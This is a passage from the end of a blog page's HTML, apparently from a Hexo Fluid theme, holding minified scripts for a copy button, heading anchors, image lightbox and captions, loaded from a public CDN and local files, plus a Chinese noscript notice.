a[i]}}).on("success",(function(e){e.clearSelection(),e.trigger.innerHTML=e.trigger.innerHTML.replace("icon-copy","icon-success"),setTimeout((function(){e.trigger.innerHTML=e.trigger.innerHTML.replace("icon-success","icon-copy")}),2e3)}))}))}}))}}()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var o=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),n=[];for(var i of o)n.push(".markdown-body > "+i.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(n.join(", "))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="/js/leancloud.js"></script><script src="/js/custom.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript></body></html>